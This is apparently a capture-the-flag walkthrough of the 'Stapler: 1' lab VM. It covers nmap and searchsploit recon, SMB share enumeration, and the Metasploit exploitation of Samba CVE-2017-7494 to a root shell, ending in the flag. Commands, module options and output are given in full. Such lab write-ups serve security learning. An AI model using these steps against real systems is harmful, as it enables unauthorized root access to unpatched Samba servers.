# Stapler: 1

## Recon

OK, first it was time to do a quick recon of available services and ports

`nmap -A 192.168.56.101`

```

Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-21 18:54 GMT
Nmap scan report for raven.local (192.168.56.101)
Host is up (0.00034s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE     VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp   open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp   open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: ODBCClient, Speaks41ProtocolOld, SupportsLoadDataLocal, IgnoreSigpipes, SupportsCompression, IgnoreSpaceBeforeParenthesis, FoundRows, LongPassword, ConnectWithDatabase, Speaks41ProtocolNew, SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, InteractiveClient, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 1pje\x08\x07##\x1Fxl{#vNxe\x1Fh:
|_  Auth Plugin Name: 88
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.70%I=7%D=12/21%Time=5C1D3705%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2000,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x
SF:152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x
SF:04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\x
SF:a2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2
SF:\x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\
SF:xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xae
SF:u\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\x
SF:d3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\x
SF:a0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\
SF:x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\
SF:xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\
SF:xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\x
SF:d5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\x
SF:af\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2
SF::\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk
SF:\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc
SF:\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xf
SF:d\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc
SF:\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0
SF:\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r
SF:\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaa
SF:k\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy
SF:\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7
SF:f\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb
SF:\[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\
SF:xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\x
SF:a7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81
SF:\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x
SF:96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8
SF:f\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf
SF:4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd
SF:\x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\x
SF:bcL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf
SF:0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04
SF:\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\
SF:xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11
SF:\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:2A:84:65 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2018-12-21T18:55:13+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-12-21 18:55:13
|_  start_date: N/A
```
So, we have an FTP server with anonymous login, HTTP server running PHP's built in web server, a DNS server, SSH access, and finally Samba.  Generally my first port of call is to determine service versions and see if there are known exploits  available.  Here are the versions nmap was able to determine

* vsftpd 2.0.8 or later
* OpenSSH 7.2p2
* MySQL 5.7.12-0ubuntu1
* PHP cli server 5.5 
* Samba 4.3.9

A quick look using searchsploit on the first 4 didn't yield much, other than a possible user enumeration exploit over OpenSSH, but Samba on the other hand had a few interesting ones

`searchsploit Samba 4. remote`

```
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                        |  Path
                                                                                                                                      | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                          | exploits/osx/remote/9924.rb
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                      | exploits/linux/remote/364.pl
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                           | exploits/linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                             | exploits/linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                | exploits/linux/remote/33598.rb
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                          | exploits/linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                            | exploits/linux/remote/37834.py
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                              | exploits/multiple/remote/41740.txt
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                               | exploits/windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                                                 | exploits/cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                                                  | exploits/windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                             | exploits/windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                                    | exploits/multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                                          | exploits/multiple/remote/21027.txt
Sambar Server 5.x - Information Disclosure                                                                                            | exploits/windows/remote/22434.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                              | exploits/windows/remote/25694.tx
```

After looking through a few of the descriptions I found my self excited with this particular exploit

**Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)**

It's an exploit based on CVE-2017-7494, which requres a writable Samba share and the ability to determine (or guess) the local folder path of the Samba share.  So with that it mind it was time for some further reconnaissance on Samba.

`nmap --script smb-enum-shares.nse -p139 192.168.56.101`

```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
MAC Address: 08:00:27:2A:84:65 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.56.101\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (red server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.101\kathy: 
|     Type: STYPE_DISKTREE
|     Comment: Fred, What are we doing here?
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\samba\
|     Anonymous access: READ
|     Current user access: READ
|   \\192.168.56.101\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.168.56.101\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: All temporary files should be stored here
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\tmp
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
```

OK, so we have a few shares available, one of which is one called *tmp*.  Nmap is able to determine the remote path as C:\var\tmp, which in the Linux world translates to /var/tmp. And as if by magic, anonymous access to our share allows us READ/WRITE access.  So that should be everything we need to exploit CVE-2017-7494.  Next stop, Metasploit.

## Shell Access

So once we have fired up Metasploit, lets find our exploit.

`msf > search known_pipe`

```
Matching Modules
================

   Name                                   Disclosure Date  Rank       Check  Description
   ----                                   ---------------  ----       -----  -----------
   exploit/linux/samba/is_known_pipename  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
```

Here she is, now lets load the module

`msf > use exploit/linux/samba/is_known_pipename`

What options do we need to set.

```
msf exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOST                            yes       The target address
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)
```

So we have already determined our local folder (SMB_FOLDER) and the share name (SMB_SHARE_NAME) along with out remote host IP (RHOST), but the RPORT is set to 445 by default, but our Samba is running on 139, so lets set our options to reflect this

```
msf exploit(linux/samba/is_known_pipename) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(linux/samba/is_known_pipename) > set RPORT 139
RPORT => 139
msf exploit(linux/samba/is_known_pipename) > set SMB_FOLDER /var/tmp
SMB_FOLDER => /var/tmp
msf exploit(linux/samba/is_known_pipename) > set SMB_SHARE_NAME tmp
SMB_SHARE_NAME => tmp
```

Time to test our exploit by executing the Metasploit `run` command

```
msf exploit(linux/samba/is_known_pipename) > run

[*] 192.168.56.101:139 - Using location \\192.168.56.101\tmp\ for the path
[*] 192.168.56.101:139 - Retrieving the remote path of the share 'tmp'
[*] 192.168.56.101:139 - Share 'tmp' has server-side path '/var/tmp
[*] 192.168.56.101:139 - Uploaded payload to \\192.168.56.101\tmp\MGRUrglC.so
[*] 192.168.56.101:139 - Loading the payload from server-side path /var/tmp/MGRUrglC.so using \\PIPE\/var/tmp/MGRUrglC.so...
[-] 192.168.56.101:139 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.56.101:139 - Loading the payload from server-side path /var/tmp/MGRUrglC.so using /var/tmp/MGRUrglC.so...
[-] 192.168.56.101:139 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.56.101:139 - Uploaded payload to \\192.168.56.101\tmp\NMKJpNjH.so
[*] 192.168.56.101:139 - Loading the payload from server-side path /var/tmp/NMKJpNjH.so using \\PIPE\/var/tmp/NMKJpNjH.so...
[-] 192.168.56.101:139 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.56.101:139 - Loading the payload from server-side path /var/tmp/NMKJpNjH.so using /var/tmp/NMKJpNjH.so...
[+] 192.168.56.101:139 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
```

And we're in, Metasploit got us a remote shell.  Now unfortunately exploiting Samba vulnerabilites generally leads to root access.  The main samba daemon will fork processes under the authenticated samba user under normal circumstances, but if you can exploit the daemon prior to the fork you generally get root

```
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

As suspected, root access.  Now lets get that flag

`cat /root/flag.txt`

```
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

















